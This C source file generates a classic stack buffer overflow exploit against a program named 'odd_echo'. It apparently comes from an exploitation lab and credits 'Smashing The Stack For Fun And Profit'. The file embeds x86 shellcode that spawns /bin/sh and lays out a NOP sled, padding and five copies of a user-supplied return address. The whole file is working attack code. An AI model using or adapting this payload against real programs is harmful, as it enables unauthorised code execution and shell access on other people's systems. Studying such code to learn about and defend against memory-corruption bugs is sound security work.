#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#define BUFFER_SIZE 200
#define NOP 0x90

// Program to generate exploit for odd_echo
// Based on code from Smashing The Stack For Fun And Profit
char shellcode[] =
   "\xeb\x1f\x5e\x89\x76\x08\x29\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x29\xdb\x89\xd8\x40\xcd"
   "\x80\xe8\xdc\xff\xff\xff/bin/sh";
   
void main(int argc, char *argv[]) {
   char *ptr;
   char buff[BUFFER_SIZE];
   int *addr_ptr, addr;
   int i;

   
   if (argc != 2) {
      printf("Usage: echo_exploit4 <return address>");
      exit(1);
   }
   
   // Initialze buff to all NOPs
   memset(buff, NOP, BUFFER_SIZE);
   addr = (int)strtol(argv[1], NULL, 16);  // exploit address to return to

   // ptr points to buf, where we build the exploit   
   ptr = buff;
   // buffer is not at multiple of 4 address, so pad with 2 bytes
   *ptr++ = 'a';
   *ptr++ = 'a';
   // addr_ptr is pointer to address
   // Set addr_ptr to ptr
   addr_ptr = (int *) ptr;
   // put 5 copies of the target return address in buf
   for (i = 0; i < 5; i++) {
      *(addr_ptr++) = addr;
      ptr += 4; // keep adjusting ptr
   }

   
   ptr += 0x80; // skip past some NOPs to give us a fudge factor
   // Write the shellcode
   for (i = 0; i < strlen(shellcode); i++) {
      *(ptr++) = shellcode[i];
   }
   
   buff[BUFFER_SIZE - 1] = '\0';
   printf("%s", buff);
}
